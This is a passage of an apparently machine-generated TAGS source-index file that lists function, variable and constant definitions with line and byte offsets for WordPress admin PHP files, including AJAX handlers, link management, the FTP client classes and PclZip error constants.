		foreach ( $_POST['sidebars'] as $key => $val ) {key1503,45903
			$sb = array();sb1504,45954
				$val = explode(',', $val);val1506,45997
				foreach ( $val as $k => $v ) {k1507,46028
function wp_ajax_save_widget() {wp_ajax_save_widget1523,46288
	$id_base = $_POST['id_base'];id_base1537,46721
	$widget_id = $_POST['widget-id'];widget_id1538,46752
	$sidebar_id = $_POST['sidebar'];sidebar_id1539,46787
	$multi_number = !empty($_POST['multi_number']) ? (int) $_POST['multi_number'] : 0;multi_number1540,46821
	$settings = isset($_POST['widget-' . $id_base]) && is_array($_POST['widget-' . $id_base]) ? $_POST['widget-' . $id_base] : false;settings1541,46905
	$error = '<p>' . __('An error has occurred. Please reload the page and try again.') . '</p>';error1542,47036
	$sidebars = wp_get_sidebars_widgets();sidebars1544,47132
	$sidebar = isset($sidebars[$sidebar_id]) ? $sidebars[$sidebar_id] : array();sidebar1545,47172
		$sidebar = array_diff( $sidebar, array($widget_id) );sidebar1553,47405
		$_POST = array('sidebar' => $sidebar_id, 'widget-' . $id_base => array(), 'the-widget-id' => $widget_id, 'delete_widget' => '1');_POST1554,47461
		$_POST['widget-' . $id_base] = array( $multi_number => array_shift($settings) );multi_number1559,47712
		$widget_id = $id_base . '-' . $multi_number;widget_id1560,47795
	foreach ( (array) $wp_registered_widget_updates as $name => $control ) {name1565,47906
		if ( $name == $id_base ) {name1567,47981
	if ( $form = $wp_registered_widget_controls[$widget_id] )form1588,48429
function wp_ajax_upload_attachment() {wp_ajax_upload_attachment1594,48565
		$post_id = $_REQUEST['post_id'];post_id1601,48744
		$post_id = null;post_id1605,48859
	$post_data = isset( $_REQUEST['post_data'] ) ? $_REQUEST['post_data'] : array();post_data1608,48882
	$attachment_id = media_handle_upload( 'async-upload', $post_id, $post_data );attachment_id1610,48965
	$post = get_post( $attachment_id );post1631,49667
function wp_ajax_image_editor() {wp_ajax_image_editor1646,50054
	$attachment_id = intval($_POST['postid']);attachment_id1647,50088
	$msg = false;msg1654,50347
			$msg = wp_save_image($attachment_id);msg1657,50405
			$msg = json_encode($msg);msg1658,50446
			$msg = wp_save_image($attachment_id);msg1662,50521
			$msg = wp_restore_image($attachment_id);msg1665,50591
function wp_ajax_set_post_thumbnail() {wp_ajax_set_post_thumbnail1673,50703
	$post_ID = intval( $_POST['post_id'] );post_ID1674,50743
	$thumbnail_id = intval( $_POST['thumbnail_id'] );thumbnail_id1677,50851
	if ( $thumbnail_id == '-1' ) {thumbnail_id1681,50958
function wp_ajax_date_format() {wp_ajax_date_format1693,51251
function wp_ajax_time_format() {wp_ajax_time_format1697,51361
function wp_ajax_wp_fullscreen_save_post() {wp_ajax_wp_fullscreen_save_post1701,51471
	$post_id = isset( $_POST['post_ID'] ) ? (int) $_POST['post_ID'] : 0;post_id1702,51516
	$post = $post_type = null;post1704,51587
		$post = get_post( $post_id );post1707,51633
		$post_type = $post->post_type;post_type1710,51680
		$post_type = $_POST['post_type'];post_type1712,51797
	$post_id = edit_post();post_id1716,51909
			$message = $post_id->get_error_message();message1720,52006
			$message = __('Save failed');message1722,52058
		$message = __('Saved.');message1727,52189
		$last_date = mysql2date( get_option('date_format'), $post->post_modified );last_date1731,52236
		$last_time = mysql2date( get_option('time_format'), $post->post_modified );last_time1732,52314
		$last_date = date_i18n( get_option('date_format') );last_date1734,52402
		$last_time = date_i18n( get_option('time_format') );last_time1735,52457
	if ( $last_id = get_post_meta($post_id, '_edit_last', true) ) {last_id1738,52516
		$last_user = get_userdata($last_id);last_user1739,52581
		$last_edited = sprintf( __('Last edited by %1$s on %2$s at %3$s'), esc_html( $last_user->display_name ), $last_date, $last_time );last_edited1740,52620
		$last_edited = sprintf( __('Last edited on %1$s at %2$s'), $last_date, $last_time );last_edited1742,52763
function wp_ajax_wp_remove_post_lock() {wp_ajax_wp_remove_post_lock1749,52952
	$post_id = (int) $_POST['post_ID'];post_id1752,53082
	if ( ! $post = get_post( $post_id ) )post1753,53119
	$active_lock = array_map( 'absint', explode( ':', $_POST['active_post_lock'] ) );active_lock1761,53314
	$new_lock = ( time() - apply_filters( 'wp_check_post_lock_window', AUTOSAVE_INTERVAL * 2 ) + 5 ) . ':' . $active_lock[1];new_lock1765,53462
function wp_ajax_dismiss_wp_pointer() {wp_ajax_dismiss_wp_pointer1770,53688
	$pointer = $_POST['pointer'];pointer1771,53728
	$dismissed = array_filter( explode( ',', (string) get_user_meta( get_current_user_id(), 'dismissed_wp_pointers', true ) ) );dismissed1777,53877
	$dismissed = implode( ',', $dismissed );dismissed1783,54087

wordpress/wp-admin/includes/bookmark.php,2603
function add_link() {add_link16,271
function edit_link( $link_id = 0 ) {edit_link28,544
function edit_link( $link_id = 0 ) {link_id28,544
function get_default_link_to_edit() {get_default_link_to_edit55,1291
	$link = new stdClass;link56,1329
function wp_delete_link( $link_id ) {wp_delete_link80,1762
function wp_get_link_cats( $link_id = 0 ) {wp_get_link_cats104,2273
function wp_get_link_cats( $link_id = 0 ) {link_id104,2273
	$cats = wp_get_object_terms( $link_id, 'link_category', array('fields' => 'ids') );cats106,2318
function get_link_to_edit( $link_id ) {get_link_to_edit119,2584
 * This function inserts/updates links into/in the database.inserts124,2681
function wp_insert_link( $linkdata, $wp_error = false ) {wp_insert_link132,2994
function wp_insert_link( $linkdata, $wp_error = false ) {wp_error132,2994
	$defaults = array( 'link_id' => 0, 'link_name' => '', 'link_url' => '', 'link_rating' => 0 );defaults135,3068
	$linkdata = wp_parse_args( $linkdata, $defaults );linkdata137,3164
	$linkdata = sanitize_bookmark( $linkdata, 'db' );linkdata138,3216
	$update = false;update142,3324
		$update = true;update145,3370
			$link_name = $link_url;link_name149,3459
		$link_rating = 0;link_rating159,3593
		$link_image = '';link_image162,3643
		$link_target = '';link_target165,3694
		$link_visible = 'Y';link_visible168,3747
		$link_owner = get_current_user_id();link_owner171,3800
		$link_notes = '';link_notes174,3869
		$link_description = '';link_description177,3925
		$link_rss = '';link_rss180,3979
		$link_rel = '';link_rel183,4025
		$link_category = array( get_option( 'default_link_category' ) );link_category187,4181
		$link_id = (int) $wpdb->insert_id;link_id204,5038
function wp_set_link_cats( $link_id = 0, $link_categories = array() ) {wp_set_link_cats227,5463
function wp_set_link_cats( $link_id = 0, $link_categories = array() ) {link_id227,5463
		$link_categories = array( get_option( 'default_link_category' ) );link_categories230,5668
	$link_categories = array_map( 'intval', $link_categories );link_categories232,5738
	$link_categories = array_unique( $link_categories );link_categories233,5799
function wp_update_link( $linkdata ) {wp_update_link248,6161
	$link_id = (int) $linkdata['link_id'];link_id249,6200
	$link = get_bookmark( $link_id, ARRAY_A );link251,6241
	$link = add_magic_quotes( $link );link254,6318
		$link_cats = $linkdata['link_category'];link_cats259,6567
		$link_cats = $link['link_category'];link_cats261,6616
	$linkdata = array_merge( $link, $linkdata );linkdata264,6723

wordpress/wp-admin/includes/class-ftp-pure.php,2799
class ftp extends ftp_base {ftp28,648
	function ftp($verb=FALSE, $le=FALSE) {ftp30,678
	function ftp($verb=FALSE, $le=FALSE) {le30,678
	function __construct($verb=FALSE, $le=FALSE) {__construct34,756
	function __construct($verb=FALSE, $le=FALSE) {le34,756
	function _settimeout($sock) {_settimeout42,1151
	function _connect($host, $port) {_connect51,1356
		$sock = @fsockopen($host, $port, $errno, $errstr, $this->_timeout);sock53,1428
		$this->_connected=true;_connected58,1617
	function _readmsg($fnction="_readmsg"){_readmsg62,1663
		$result=true;result67,1800
		$this->_message="";_message68,1816
		$this->_code=0;_code69,1838
		$go=true;go70,1856
			$tmp=@fgets($this->_ftp_control_sock, 512);tmp72,1875
				$go=$result=false;go74,1944
				if(preg_match("/^([0-9]{3})(-(.*[".CRLF."]{1,2})+\\1)? [^".CRLF."]+[".CRLF."]{1,2}$/", $this->_message, $regs)) $go=false;go78,2052
		$this->_code=(int)$regs[1];_code82,2272
	function _exec($cmd, $fnction="_exec") {_exec86,2324
	function _exec($cmd, $fnction="_exec") {fnction86,2324
		$status=@fputs($this->_ftp_control_sock, $cmd.CRLF);status92,2505
		$this->_lastaction=time();_lastaction97,2658
	function _data_prepare($mode=FTP_ASCII) {_data_prepare102,2753
			$ip_port = explode(",", ereg_replace("^.+ \\(?([0-9]{1,3},[0-9]{1,3},[0-9]{1,3},[0-9]{1,3},[0-9]+,[0-9]+)\\)?.*".CRLF."$", "\\1", $this->_message));ip_port113,3031
			$this->_datahost=$ip_port[0].".".$ip_port[1].".".$ip_port[2].".".$ip_port[3];_datahost114,3183
            $this->_dataport=(((int)$ip_port[4])<<8) + ((int)$ip_port[5]);_dataport115,3264
			$this->_ftp_data_sock=@fsockopen($this->_datahost, $this->_dataport, $errno, $errstr, $this->_timeout);_ftp_data_sock117,3414
	function _data_read($mode=FTP_ASCII, $fp=NULL) {_data_read131,3824
	function _data_read($mode=FTP_ASCII, $fp=NULL) {fp131,3824
		if(is_resource($fp)) $out=0;out132,3874
		else $out="";out133,3905
			$block=fread($this->_ftp_data_sock, $this->_ftp_buff_size);block139,4066
			if($mode!=FTP_BINARY) $block=preg_replace("/\r\n|\r|\n/", $this->_eol_code[$this->OS_local], $block);block140,4129
	function _data_write($mode=FTP_ASCII, $fp=NULL) {_data_write147,4346
	function _data_write($mode=FTP_ASCII, $fp=NULL) {fp147,4346
		if(is_resource($fp)) $out=0;out148,4397
		else $out="";out149,4428
				$block=fread($fp, $this->_ftp_buff_size);block156,4596
	function _data_write_block($mode, $block) {_data_write_block163,4793
		if($mode!=FTP_BINARY) $block=preg_replace("/\r\n|\r|\n/", $this->_eol_code[$this->OS_remote], $block);block164,4838
			$block=substr($block, $t);block170,5095
	function _data_close() {_data_close175,5171
	function _quit($force=FALSE) {_quit181,5306
			$this->_connected=false;_connected184,5412

wordpress/wp-admin/includes/class-ftp-sockets.php,2972
class ftp extends ftp_base {ftp28,635
	function ftp($verb=FALSE, $le=FALSE) {ftp30,665
	function ftp($verb=FALSE, $le=FALSE) {le30,665
	function __construct($verb=FALSE, $le=FALSE) {__construct34,743
	function __construct($verb=FALSE, $le=FALSE) {le34,743
	function _settimeout($sock) {_settimeout42,1137
	function _connect($host, $port) {_connect56,1689
		$this->_connected=true;_connected69,2252
	function _readmsg($fnction="_readmsg"){_readmsg73,2298
		$result=true;result78,2434
		$this->_message="";_message79,2450
		$this->_code=0;_code80,2472
		$go=true;go81,2490
			$tmp=@socket_read($this->_ftp_control_sock, 4096, PHP_BINARY_READ);tmp83,2509
				$go=$result=false;go85,2602
				$go = !preg_match("/^([0-9]{3})(-.+\\1)? [^".CRLF."]+".CRLF."$/Us", $this->_message, $regs);go89,2772
		$this->_code=(int)$regs[1];_code93,2962
	function _exec($cmd, $fnction="_exec") {_exec97,3014
	function _exec($cmd, $fnction="_exec") {fnction97,3014
		$status=@socket_write($this->_ftp_control_sock, $cmd.CRLF);status103,3195
		$this->_lastaction=time();_lastaction108,3406
	function _data_prepare($mode=FTP_ASCII) {_data_prepare113,3501
		$this->_ftp_data_sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);_ftp_data_sock116,3630
			$ip_port = explode(",", ereg_replace("^.+ \\(?([0-9]{1,3},[0-9]{1,3},[0-9]{1,3},[0-9]{1,3},[0-9]+,[0-9]+)\\)?.*".CRLF."$", "\\1", $this->_message));ip_port134,4166
			$this->_datahost=$ip_port[0].".".$ip_port[1].".".$ip_port[2].".".$ip_port[3];_datahost135,4318
            $this->_dataport=(((int)$ip_port[4])<<8) + ((int)$ip_port[5]);_dataport136,4399
			else $this->_ftp_temp_sock=$this->_ftp_data_sock;_ftp_temp_sock143,4798
	function _data_read($mode=FTP_ASCII, $fp=NULL) {_data_read177,6124
	function _data_read($mode=FTP_ASCII, $fp=NULL) {fp177,6124
		$NewLine=$this->_eol_code[$this->OS_local];NewLine178,6174
		if(is_resource($fp)) $out=0;out179,6220
		else $out="";out180,6251
			$this->_ftp_temp_sock=socket_accept($this->_ftp_data_sock);_ftp_temp_sock183,6367
			if($mode!=FTP_BINARY) $block=preg_replace("/\r\n|\r|\n/", $this->_eol_code[$this->OS_local], $block);block193,6764
	function _data_write($mode=FTP_ASCII, $fp=NULL) {_data_write200,6981
	function _data_write($mode=FTP_ASCII, $fp=NULL) {fp200,6981
		$NewLine=$this->_eol_code[$this->OS_local];NewLine201,7032
		if(is_resource($fp)) $out=0;out202,7078
		else $out="";out203,7109
			$this->_ftp_temp_sock=socket_accept($this->_ftp_data_sock);_ftp_temp_sock206,7225
				$block=fread($fp, $this->_ftp_buff_size);block215,7540
	function _data_write_block($mode, $block) {_data_write_block222,7737
		if($mode!=FTP_BINARY) $block=preg_replace("/\r\n|\r|\n/", $this->_eol_code[$this->OS_remote], $block);block223,7782
			$block=substr($block, $t);block230,8121
	function _data_close() {_data_close235,8197
	function _quit() {_quit242,8378
			$this->_connected=false;_connected245,8468

wordpress/wp-admin/includes/class-ftp.php,13262
if(!defined('CRLF')) define('CRLF',"\r\n");CRLF23,443
if(!defined("FTP_AUTOASCII")) define("FTP_AUTOASCII", -1);FTP_AUTOASCII33,597
if(!defined("FTP_BINARY")) define("FTP_BINARY", 1);FTP_BINARY41,720
if(!defined("FTP_ASCII")) define("FTP_ASCII", 0);FTP_ASCII49,836
if(!defined('FTP_FORCE')) define('FTP_FORCE', true);FTP_FORCE59,979
define('FTP_OS_Unix','u');FTP_OS_Unix65,1070
define('FTP_OS_Windows','w');FTP_OS_Windows71,1135
define('FTP_OS_Mac','m');FTP_OS_Mac77,1203
class ftp_base {ftp_base83,1262
	var $LocalEcho;LocalEcho85,1303
	var $Verbose;Verbose86,1320
	var $OS_local;OS_local87,1335
	var $OS_remote;OS_remote88,1351
	var $_lastaction;_lastaction91,1394
	var $_errors;_errors92,1413
	var $_type;_type93,1428
	var $_umask;_umask94,1441
	var $_timeout;_timeout95,1455
	var $_passive;_passive96,1471
	var $_host;_host97,1487
	var $_fullhost;_fullhost98,1500
	var $_port;_port99,1517
	var $_datahost;_datahost100,1530
	var $_dataport;_dataport101,1547
	var $_ftp_control_sock;_ftp_control_sock102,1564
	var $_ftp_data_sock;_ftp_data_sock103,1589
	var $_ftp_temp_sock;_ftp_temp_sock104,1611
	var $_ftp_buff_size;_ftp_buff_size105,1633
	var $_login;_login106,1655
	var $_password;_password107,1669
	var $_connected;_connected108,1686
	var $_ready;_ready109,1704
	var $_code;_code110,1718
	var $_message;_message111,1731
	var $_can_restore;_can_restore112,1747
	var $_port_available;_port_available113,1767
	var $_curtype;_curtype114,1790
	var $_features;_features115,1806
	var $_error_array;_error_array117,1824
	var $AuthorizedTransferMode;AuthorizedTransferMode118,1844
	var $OS_FullName;OS_FullName119,1874
	var $_eol_code;_eol_code120,1893
	var $AutoAsciiExt;AutoAsciiExt121,1910
	function ftp_base($port_mode=FALSE) {ftp_base124,1950
	function __construct($port_mode=FALSE, $verb=FALSE, $le=FALSE) {__construct128,2027
	function __construct($port_mode=FALSE, $verb=FALSE, $le=FALSE) {verb128,2027
		$this->LocalEcho=$le;LocalEcho129,2093
		$this->Verbose=$verb;Verbose130,2117
		$this->_lastaction=NULL;_lastaction131,2141
		$this->_error_array=array();_error_array132,2168
		$this->_eol_code=array(FTP_OS_Unix=>"\n", FTP_OS_Mac=>"\r", FTP_OS_Windows=>"\r\n");_eol_code133,2199
		$this->AuthorizedTransferMode=array(FTP_AUTOASCII, FTP_ASCII, FTP_BINARY);AuthorizedTransferMode134,2286
		$this->OS_FullName=array(FTP_OS_Unix => 'UNIX', FTP_OS_Windows => 'WINDOWS', FTP_OS_Mac => 'MACOS');OS_FullName135,2363
		$this->AutoAsciiExt=array("ASP","BAT","C","CPP","CSS","CSV","JS","H","HTM","HTML","SHTML","INI","LOG","PHP3","PHTML","PL","PERL","SH","SQL","TXT");AutoAsciiExt136,2466
		$this->_port_available=($port_mode==TRUE);_port_available137,2616
		$this->_connected=FALSE;_connected139,2764
		$this->_ready=FALSE;_ready140,2791
		$this->_can_restore=FALSE;_can_restore141,2814
		$this->_code=0;_code142,2843
		$this->_message="";_message143,2861
		$this->_ftp_buff_size=4096;_ftp_buff_size144,2883
		$this->_curtype=NULL;_curtype145,2913
		$this->_login="anonymous";_login150,3063
		$this->_password="anon@ftp.com";_password151,3092
		$this->_features=array();_features152,3127
	    $this->OS_local=FTP_OS_Unix;OS_local153,3155
		$this->OS_remote=FTP_OS_Unix;OS_remote154,3189
		$this->features=array();features155,3221
		if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $this->OS_local=FTP_OS_Windows;OS_local156,3248
		elseif(strtoupper(substr(PHP_OS, 0, 3)) === 'MAC') $this->OS_local=FTP_OS_Mac;OS_local157,3329
	function parselisting($line) {parselisting164,3715
		$is_windows = ($this->OS_remote == FTP_OS_Windows);is_windows165,3747
			$b = array();b167,3941
		} else if (!$is_windows && $lucifer=preg_split("/[ ]/",$line,9,PREG_SPLIT_NO_EMPTY)) {lucifer183,4528
			$lcount=count($lucifer);lcount185,4639
			$b = array();b187,4696
	function SendMSG($message = "", $crlf=true) {SendMSG226,5819
	function SendMSG($message = "", $crlf=true) {crlf226,5819
	function SetType($mode=FTP_AUTOASCII) {SetType234,5959
		$this->_type=$mode;_type239,6110
	function _settype($mode=FTP_ASCII) {_settype244,6273
					$this->_curtype=FTP_BINARY;_curtype249,6456
				$this->_curtype=FTP_ASCII;_curtype253,6594
	function Passive($pasv=NULL) {Passive259,6672
		if(is_null($pasv)) $this->_passive=!$this->_passive;_passive260,6704
		else $this->_passive=$pasv;_passive261,6759
			$this->_passive=TRUE;_passive264,6900
	function SetServer($host, $port=21, $reconnect=true) {SetServer271,7029
	function SetServer($host, $port=21, $reconnect=true) {port271,7029
	        $this->verbose=true;verbose273,7109
			$ip=@gethostbyname($host);ip277,7217
	        $dns=@gethostbyaddr($host);dns278,7247
	        if(!$ip) $ip=$host;ip279,7284
	        if(!$dns) $dns=$host;dns280,7313
	        $ipaslong = ip2long($ip);ipaslong283,7521
	        $this->_host=$ip;_host288,7695
	        $this->_fullhost=$dns;_fullhost289,7722
	        $this->_port=$port;_port290,7754
	        $this->_dataport=$port-1;_dataport291,7783
	function SetUmask($umask=0022) {SetUmask304,8103
		$this->_umask=$umask;_umask305,8137
	function SetTimeout($timeout=30) {SetTimeout311,8255
		$this->_timeout=$timeout;_timeout312,8291
	function connect($server=NULL) {connect319,8475
			$this->_lastaction=time();_lastaction333,9096
		$this->_ready=true;_ready335,9155
		$syst=$this->systype();syst336,9177
			if(preg_match("/win|dos|novell/i", $syst[0])) $this->OS_remote=FTP_OS_Windows;OS_remote339,9267
			elseif(preg_match("/os/i", $syst[0])) $this->OS_remote=FTP_OS_Mac;OS_remote340,9349
			elseif(preg_match("/(li|u)nix/i", $syst[0])) $this->OS_remote=FTP_OS_Unix;OS_remote341,9419
			else $this->OS_remote=FTP_OS_Mac;OS_remote342,9497
	function quit($force=false) {quit350,9813
			$this->_ready=false;_ready354,9975
	function login($user=NULL, $pass=NULL) {login361,10079
	function login($user=NULL, $pass=NULL) {pass361,10079
		if(!is_null($user)) $this->_login=$user;_login362,10121
		else $this->_login="anonymous";_login363,10164
		if(!is_null($pass)) $this->_password=$pass;_password364,10198
		else $this->_password="anon@anon.com";_password365,10244
	function pwd() {pwd380,10852
	function cdup() {cdup386,11034
	function chdir($pathname) {chdir392,11163
	function rmdir($pathname) {rmdir398,11313
	function mkdir($pathname) {mkdir404,11463
	function rename($from, $to) {rename410,11613
	function filesize($pathname) {filesize420,11912
	function abort() {abort430,12250
	function mdtm($pathname) {mdtm440,12501
		$mdtm = ereg_replace("^[0-9]{3} ([0-9]+)".CRLF, "\\1", $this->_message);mdtm447,12749
		$date = sscanf($mdtm, "%4d%2d%2d%2d%2d%2d");date448,12824
		$timestamp = mktime($date[3], $date[4], $date[5], $date[1], $date[2], $date[0]);timestamp449,12871
	function systype() {systype453,12979
		$DATA = explode(" ", $this->_message);DATA456,13095
	function delete($pathname) {delete460,13176
	function site($command, $fnction="site") {site466,13329
	function site($command, $fnction="site") {fnction466,13329
	function chmod($pathname, $mode) {chmod472,13495
	function restore($from) {restore477,13635
	function features() {features491,14022
		$f=preg_split("/[".CRLF."]+/", preg_replace("/[0-9]{3}[ -].*[".CRLF."]+/", "", $this->_message), -1, PREG_SPLIT_NO_EMPTY);f494,14140
		$this->_features=array();_features495,14265
		foreach($f as $k=>$v) {k496,14293
			$v=explode(" ", trim($v));v497,14319
	function rawlist($pathname="", $arg="") {rawlist503,14413
	function rawlist($pathname="", $arg="") {arg503,14413
	function nlist($pathname="") {nlist507,14551
	function is_exists($pathname) {is_exists511,14676
	function file_exists($pathname) {file_exists515,14753
		$exists=true;exists516,14788
		if(!$this->_exec("RNFR ".$pathname, "rename")) $exists=FALSE;exists517,14804
			if(!$this->_checkCode()) $exists=FALSE;exists519,14877
	function fget($fp, $remotefile,$rest=0) {fget527,15098
		$pi=pathinfo($remotefile);pi529,15199
		if($this->_type==FTP_ASCII or ($this->_type==FTP_AUTOASCII and in_array(strtoupper($pi["extension"]), $this->AutoAsciiExt))) $mode=FTP_ASCII;mode530,15228
		else $mode=FTP_BINARY;mode531,15372
		$out=$this->_data_read($mode, $fp);out544,15688
	function get($remotefile, $localfile=NULL, $rest=0) {get551,15849
	function get($remotefile, $localfile=NULL, $rest=0) {localfile551,15849
		if(is_null($localfile)) $localfile=$remotefile;localfile552,15904
		$fp = @fopen($localfile, "w");fp554,16046
		$pi=pathinfo($remotefile);pi560,16260
		if($this->_type==FTP_ASCII or ($this->_type==FTP_AUTOASCII and in_array(strtoupper($pi["extension"]), $this->AutoAsciiExt))) $mode=FTP_ASCII;mode561,16289
		else $mode=FTP_BINARY;mode562,16433
		$out=$this->_data_read($mode, $fp);out578,16797
	function fput($remotefile, $fp) {fput586,16973
		$pi=pathinfo($remotefile);pi588,17066
		if($this->_type==FTP_ASCII or ($this->_type==FTP_AUTOASCII and in_array(strtoupper($pi["extension"]), $this->AutoAsciiExt))) $mode=FTP_ASCII;mode589,17095
		else $mode=FTP_BINARY;mode590,17239
		$ret=$this->_data_write($mode, $fp);ret603,17555
	function put($localfile, $remotefile=NULL, $rest=0) {put610,17717
	function put($localfile, $remotefile=NULL, $rest=0) {remotefile610,17717
		if(is_null($remotefile)) $remotefile=$localfile;remotefile611,17772
		$fp = @fopen($localfile, "r");fp616,17978
		$pi=pathinfo($localfile);pi623,18196
		if($this->_type==FTP_ASCII or ($this->_type==FTP_AUTOASCII and in_array(strtoupper($pi["extension"]), $this->AutoAsciiExt))) $mode=FTP_ASCII;mode624,18224
		else $mode=FTP_BINARY;mode625,18368
		$ret=$this->_data_write($mode, $fp);ret641,18732
	function mput($local=".", $remote=NULL, $continious=false) {mput649,18909
	function mput($local=".", $remote=NULL, $continious=false) {remote649,18909
		$local=realpath($local);local650,18971
		if(empty($remote)) $remote=".";remote656,19199
			$list=array();list659,19347
		$ret=true;ret669,19652
			if(is_dir($local."/".$el)) $t=$this->mput($local."/".$el, $remote."/".$el);t671,19691
			else $t=$this->put($local."/".$el, $remote."/".$el);t672,19770
				$ret=FALSE;ret674,19839
	function mget($remote, $local=".", $continious=false) {mget682,19912
	function mget($remote, $local=".", $continious=false) {local682,19912
		$list=$this->rawlist($remote, "-lA");list683,19969
		foreach($list as $k=>$v) {k695,20377
		$ret=true;ret699,20523
					$ret=false;ret704,20825
					$ret=false;ret710,21108
			$t=strtotime($el["date"]);t715,21214
	function mdel($remote, $continious=false) {mdel721,21333
	function mdel($remote, $continious=false) {continious721,21333
		$list=$this->rawlist($remote, "-la");list722,21378
		foreach($list as $k=>$v) {k728,21576
		$ret=true;ret732,21722
					$ret=false;ret740,21885
					$ret=false;ret746,22112
			$ret=false;ret754,22319
	function mmkdir($dir, $mode = 0777) {mmkdir759,22357
	function mmkdir($dir, $mode = 0777) {mode759,22357
		if($this->is_exists($dir) or $dir == "/" ) return TRUE;dir761,22428
		$r=$this->mkdir($dir, $mode);r763,22543
	function glob($pattern, $handle=NULL) {glob768,22620
	function glob($pattern, $handle=NULL) {handle768,22620
		$path=$output=null;path769,22661
		if(PHP_OS=='WIN32') $slash='\\';slash770,22683
		else $slash='/';slash771,22718
		$lastpos=strrpos($pattern,$slash);lastpos772,22737
			$path=substr($pattern,0,-$lastpos-1);path774,22802
			$pattern=substr($pattern,$lastpos);pattern775,22843
		} else $path=getcwd();path776,22882
			$handle=@opendir($path);handle783,23069
	function glob_pattern_match($pattern,$string) {glob_pattern_match795,23328
		$out=null;out796,23377
		$chunks=explode(';',$pattern);chunks797,23390
			$escape=array('$','^','.','{','}','(',')','[',']','|');escape799,23456
				$pattern=str_replace('**','*',$pattern);pattern801,23555
				$pattern=str_replace($probe,"\\$probe",$pattern);pattern803,23630
			$pattern=str_replace('?*','*',pattern804,23684
	function glob_regexp($pattern,$probe) {glob_regexp818,24030
		$sensitive=(PHP_OS!='WIN32');sensitive819,24071
	function dirlist($remote) {dirlist826,24186
		$list=$this->rawlist($remote, "-la");list827,24215
		$dirlist = array();dirlist833,24416
		foreach($list as $k=>$v) {k834,24438
			$entry=$this->parselisting($v);entry835,24467
	function _checkCode() {_checkCode850,24972
	function _list($arg="", $cmd="LIST", $fnction="_list") {_list854,25049
	function _list($arg="", $cmd="LIST", $fnction="_list") {cmd854,25049
		$out="";out864,25315
			$out=$this->_data_read();out866,25351
			$out=preg_split("/[".CRLF."]+/", $out, -1, PREG_SPLIT_NO_EMPTY);out871,25524
	function PushError($fctname,$msg,$desc=false){PushError881,26040
		$error=array();error882,26088
		if($desc) $tmp=' ('.$desc.')'; else $tmp='';tmp887,26207
	function PopError(){PopError893,26380
$mod_sockets = extension_loaded( 'sockets' );mod_sockets899,26504
	$prefix = ( PHP_SHLIB_SUFFIX == 'dll' ) ? 'php_' : '';prefix901,26624
	$mod_sockets = extension_loaded( 'sockets' );mod_sockets903,26729

wordpress/wp-admin/includes/class-pclzip.php,44238
    define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );PCLZIP_READ_BLOCK_SIZE30,1238
    define( 'PCLZIP_SEPARATOR', ',' );PCLZIP_SEPARATOR44,1889
    define( 'PCLZIP_ERROR_EXTERNAL', 0 );PCLZIP_ERROR_EXTERNAL53,2227
  // define( 'PCLZIP_TEMPORARY_DIR', '/temp/' );PCLZIP_TEMPORARY_DIR63,2555
  // define( 'PCLZIP_TEMPORARY_DIR', 'C:/Temp/' );PCLZIP_TEMPORARY_DIR64,2604
    define( 'PCLZIP_TEMPORARY_DIR', '' );PCLZIP_TEMPORARY_DIR66,2697
  // define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.5 );PCLZIP_TEMPORARY_FILE_RATIO76,3123
    define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );PCLZIP_TEMPORARY_FILE_RATIO78,3223
  $g_pclzip_version = "2.8.2";g_pclzip_version86,3536
  define( 'PCLZIP_ERR_USER_ABORTED', 2 );PCLZIP_ERR_USER_ABORTED103,4143
  define( 'PCLZIP_ERR_NO_ERROR', 0 );PCLZIP_ERR_NO_ERROR104,4185
  define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );PCLZIP_ERR_WRITE_OPEN_FAIL105,4223
  define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );PCLZIP_ERR_READ_OPEN_FAIL106,4269
  define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );PCLZIP_ERR_INVALID_PARAMETER107,4314
  define( 'PCLZIP_ERR_MISSING_FILE', -4 );PCLZIP_ERR_MISSING_FILE108,4362
  define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );PCLZIP_ERR_FILENAME_TOO_LONG109,4405
  define( 'PCLZIP_ERR_INVALID_ZIP', -6 );PCLZIP_ERR_INVALID_ZIP110,4453
  define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );PCLZIP_ERR_BAD_EXTRACTED_FILE111,4495
  define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );PCLZIP_ERR_DIR_CREATE_FAIL112,4544
  define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );PCLZIP_ERR_BAD_EXTENSION113,4590
  define( 'PCLZIP_ERR_BAD_FORMAT', -10 );PCLZIP_ERR_BAD_FORMAT114,4634
  define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );PCLZIP_ERR_DELETE_FILE_FAIL115,4676
  define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );PCLZIP_ERR_RENAME_FILE_FAIL116,4724
  define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );PCLZIP_ERR_BAD_CHECKSUM117,4772
  define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );PCLZIP_ERR_INVALID_ARCHIVE_ZIP118,4816
  define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );PCLZIP_ERR_MISSING_OPTION_VALUE119,4867
  define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );PCLZIP_ERR_INVALID_OPTION_VALUE120,4919
  define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );PCLZIP_ERR_ALREADY_A_DIRECTORY121,4971
  define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );PCLZIP_ERR_UNSUPPORTED_COMPRESSION122,5022
  define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );PCLZIP_ERR_UNSUPPORTED_ENCRYPTION123,5077
  define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE124,5131
  define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );PCLZIP_ERR_DIRECTORY_RESTRICTION125,5186
